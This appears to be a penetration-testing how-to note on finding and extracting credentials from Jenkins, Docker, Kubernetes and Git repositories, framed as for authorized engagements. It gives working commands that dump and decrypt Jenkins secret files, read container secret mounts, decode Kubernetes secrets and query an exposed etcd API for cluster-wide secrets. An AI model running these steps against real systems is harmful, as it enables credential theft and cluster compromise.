# DevOps Processing Examples

The following examples illustrate how DevOps-related credentials may be identified and processed during **authorized security assessments**, audits, or investigations.  
All techniques described here must only be performed with explicit permission and within the scope of an approved engagement.

---

## Jenkins

### Scenario

During an authorized engagement, credentials are obtained for a Jenkins user with permission to create or modify build jobs.  
Because Jenkins stores credentials encrypted on disk but decrypts them at runtime, a sufficiently privileged user can extract and decrypt stored secrets by executing a controlled build job.

This scenario demonstrates how build permissions can translate into **credential disclosure risk**.

---

### Step 1: Access the Jenkins Script Console

Authenticate to Jenkins using the provided credentials and navigate to the script or job creation interface:

`https://<jenkins_host>/script/`

---

### Step 2: Create a Controlled Build Job

Create a new freestyle project and configure it to run on the master node:

Navigation path:

`New Item → Freestyle Project Configure → General → Restrict where this project can be run → Master Build → Add Build Step → Execute Shell`

---

### Step 3: Extract Encrypted Credential Artifacts

Add the following commands to the build step to output credential files and encryption keys:

`echo "credentials.xml" cat ${JENKINS_HOME}/credentials.xml  echo "master.key" cat ${JENKINS_HOME}/secrets/master.key | base64 -w 0  echo "hudson.util.Secret" cat ${JENKINS_HOME}/secrets/hudson.util.Secret | base64 -w 0`

---

### Step 4: Execute the Build

Save the job and click **Build Now**.

---

### Step 5: Retrieve Build Output

Navigate to **Build History**, select the build number, and open **Console Output**.  
Copy the displayed contents for offline analysis.

---

### Step 6: Prepare Local Files

On your analysis workstation:

- Save the `credentials.xml` output to a local file
    
- Decode the base64-encoded secrets into separate files:
    

`echo "<base64_master_key>" | base64 --decode > master.key echo "<base64_hudson_secret>" | base64 --decode > hudson.util.Secret`

---

### Step 7: Decrypt Stored Credentials

Download the Jenkins decryption utility:

[https://github.com/tweksteen/jenkins-decrypt](https://github.com/tweksteen/jenkins-decrypt)

Use it to decrypt the credential store:

`python decrypt.py master.key hudson.util.Secret credentials.xml`

This reveals stored credentials and highlights the **impact of build-level privilege** within Jenkins.

---

## Docker

### Scenario

When access is gained to a Docker container or host during an authorized assessment, secrets may be exposed through mounted files, environment variables, or Docker-managed secrets.

---

### Enumerate Docker Secrets

List available Docker secrets:

`docker secret ls`

---

### Common Secret Locations

Depending on the operating system, secrets may be mounted at predictable paths.

**Linux containers:**

`/run/secrets/<secret_name>`

**Windows containers:**

`C:\ProgramData\Docker\internal\secrets C:\ProgramData\Docker\secrets`

These locations should be reviewed for plaintext credentials, API tokens, or configuration secrets.

---

## Kubernetes

### Scenario

Kubernetes clusters store sensitive data such as passwords, tokens, and keys as **Secrets**.  
Improper access controls or misconfigurations can expose these values to unauthorized workloads or users.

---

### Enumerate Secrets

List and inspect secrets:

`kubectl get secrets kubectl describe secret <secret_name>`

---

### Decode Secret Values

Most Kubernetes secrets are base64-encoded:

`echo "<base64_value>" | base64 --decode`

Also inspect pod volume mounts, where secrets may be exposed as files.

---

### Etcd Exposure (High Impact)

In misconfigured clusters, the etcd API (commonly on port **2379**) may be exposed.

#### Step 1: Query etcd

`http://<kube_host>:2379/v2/keys/?recursive=true`

#### Step 2: Analyze Results

Review returned data for credentials, service account tokens, or cluster secrets.

This represents **full cluster compromise** in many environments.

---

## Git Repositories

### Scenario

Source code repositories frequently contain exposed credentials, API keys, and secrets due to poor hygiene or legacy commits.

Searching repositories is often one of the **highest-yield credential discovery techniques**.

---

### TruffleHog

TruffleHog scans Git history for high-entropy strings and known secret patterns.

Repository:  
[https://github.com/dxa4481/truffleHog](https://github.com/dxa4481/truffleHog)

Install:

`pip install truffleHog`

Scan a repository:

`truffleHog --regex --entropy=False https://github.com/org/repo.git truffleHog file:///path/to/local/repo`

---

### Gitrob

Gitrob analyzes GitHub or GitLab organizations for potentially sensitive files across commit history.

Repositories:

- [https://github.com/michenriksen/gitrob](https://github.com/michenriksen/gitrob)
    

[https://github.com/michenriksen/gitrob/releases](https://github.com/michenriksen/gitrob/releases)

#### Step 1: Obtain a GitHub Access Token

`https://github.com/settings/tokens`

#### Step 2: Run Gitrob

`gitrob analyze <username> \   --site=https://github.example.com \   --endpoint=https://github.example.com/api/v3 \   --access-tokens=token1,token2`

Gitrob highlights files and patterns commonly associated with credential leakage.

---
[[Processing]]
[[Home]]


#howto #education #sudad #tools 